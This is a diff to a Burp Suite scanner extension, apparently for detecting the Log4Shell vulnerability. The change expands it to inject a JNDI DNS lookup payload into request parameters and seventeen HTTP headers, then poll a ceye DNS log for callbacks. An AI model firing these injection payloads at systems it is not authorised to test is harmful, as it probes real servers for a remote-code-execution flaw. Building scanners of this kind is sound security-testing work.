@@ -14,7 +14,6 @@ _author_ = 'nul1'
 
 class Ceye:
     def __init__(self, rand):
-        # 配置ceye信息
         self.host = ""
         self.token = ""
         self.rand = rand
@@ -68,6 +67,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         
         httpService = baseRequestResponse.getHttpService()   
 
+        # 获取请求数据
         reqHeaders = list(analyzedIRequestInfo.getHeaders())
         reqParameters = analyzedIRequestInfo.getParameters()  
         reqUrl = analyzedIRequestInfo.getUrl().toString()
@@ -75,33 +75,44 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
 
         if self.urlFilter(reqUrl):
-
             for parameter in reqParameters:
                 parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
 
-                # 去除Cookie
                 if parameterType != 2:
+
                     rand = self.randomString()
                     ceye = Ceye(rand)
                     domain = reqUrl.split('//')[1].split('.')[0]
 
-                    payload = [quote("${{jndi:dns://{}.{}.{}/test}}".format(rand, domain, ceye.host))]
+                    payload = [quote("${{jndi:dns://{}.{}.{}/test}}".format(rand, domain, ceye.host)),]
+
+                    header_list = ["User-Agent", "X-CSRF-Token", "Origin", "Cookie", "Referer", "Accept-Language", "X-Forwarded-For", "X-Client-Ip", "X-Remote-Ip", "X-Remote-Addr", "X-Originating-Ip", "X-CSRFToken", "Cf-Connecting_ip", "If-Modified-Since", "X-Api-Version", "X-Wap-Profile", "Location"]
 
                     for p in payload:
-
                         parameterValuePayload = p
-                        #print("[*] scan -> " + parameterName + '=' + parameterValuePayload)
-    
+                        print("[*] scan {} [{}=payload]".format(reqUrl, parameterName))
+
+                        for head in header_list:
+                            reqHeaders.append("{0}: {1}".format(head, parameterValuePayload))
+
+                        # 添加header头
+                        newRequest = self._helpers.buildHttpMessage(reqHeaders, reqBodys)
+                        
+                        # 构建参数
                         newParameter = self._helpers.buildParameter(parameterName, parameterValuePayload, parameterType)
 
-                        newRequest = self._helpers.updateParameter(request, newParameter)
-                        newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)
-                        response = newIHttpRequestResponse.getResponse() 
+                        # 更新请求包
+                        finRequest = self._helpers.updateParameter(newRequest, newParameter)
 
+                        # 发送请求
+                        newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, finRequest)
+
+                        # 获取响应包
+                        response = newIHttpRequestResponse.getResponse() 
                         analyzedIResponseInfo = self._helpers.analyzeResponse(response)  
                         resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
-                         
-                        # 设置延迟，获取dnslog
+
+                        # 设置延迟处理dnslog
                         sleep(1.5)
                         dnslog = ceye.get_dns()
 
@@ -117,7 +128,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
                             self._callbacks.addScanIssue(issue)
                             return
-
+            print("=====================================Done=====================================")
 
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         if existingIssue.getIssueName() == newIssue.getIssueName():
@@ -171,6 +182,5 @@ class CustomIssue(IScanIssue):
 
     def getSeverity(self):
         return self.Severity
-
 
 
